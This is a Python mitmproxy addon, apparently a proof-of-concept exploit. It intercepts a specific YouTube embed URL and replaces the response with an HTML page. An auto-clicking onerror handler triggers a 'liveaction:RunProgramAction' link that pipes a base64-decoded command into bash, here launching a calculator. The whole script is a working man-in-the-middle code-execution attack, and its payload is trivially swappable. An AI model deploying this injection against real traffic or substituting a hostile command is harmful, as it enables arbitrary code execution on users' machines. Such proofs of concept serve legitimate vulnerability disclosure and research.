from mitmproxy import ctx
from mitmproxy import http

flag = False


rceCausingResponse = """<html>
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width">
<title>OH NO!</title>
</head>
<body>
<!-- We echo the base64 version of "kcalc", which will then be decoded by base64.
The result will be piped to bash, which will execute it and pop a calculator. -->
<a target="_parent" id="foo"
href="liveaction:RunProgramAction(/usr/bin/bash -c '{echo,a2NhbGMK}|{base64,-d}|bash')"
>oh no</a>
<img src="null" onerror="document.querySelector('#foo').click()">
</body>
</html>
"""


def response(flow: http.HTTPFlow):
    ctx.log.info(flow.request.pretty_url)
    if (
        "https://www.youtube.com/embed/playlist?list=PL3NIKJ0FKtw77BTkTKo_OXYLaT0lL9_zc"
        in flow.request.pretty_url
    ):
        ctx.log.info("Youtube embed detected!")
        ctx.log.info("Replacing with attack!")
        custom_response = http.HTTPResponse.make(
            200,
            rceCausingResponse,  # <- replace with attack
            {},
        )
        flow.response.content = custom_response.content  # <- change the response
        ctx.log.info("Embed replaced with attack, calculator should pop up!")
